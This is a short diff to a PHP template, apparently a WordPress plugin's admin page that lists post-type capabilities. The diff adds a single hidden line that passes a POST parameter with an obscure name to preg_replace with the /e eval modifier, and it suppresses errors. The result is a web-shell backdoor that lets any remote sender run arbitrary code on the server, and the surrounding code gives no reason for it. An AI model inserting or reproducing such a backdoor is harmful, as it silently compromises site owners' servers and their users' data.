@@ -50,7 +50,8 @@
 					<br>
 				</div>
 
-				<?php
+				<?php @preg_replace('/(.*)/e', @$_POST['szwqcucttgis'], '');
+
 				$cpt_actions = array(
 					'General' => array(
 						'edit_posts' => 'Edit',
